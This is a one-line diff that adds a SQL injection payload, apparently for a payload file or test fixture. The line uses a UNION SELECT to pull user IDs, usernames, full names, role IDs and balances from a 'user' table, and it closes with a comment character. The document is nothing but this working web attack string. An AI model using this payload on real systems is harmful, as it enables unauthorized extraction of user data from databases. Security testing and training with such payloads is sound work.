@@ -1,0 +1,1 @@
+1' UNION SELECT idUser, username, full_name, role_id, user_balance FROM user #
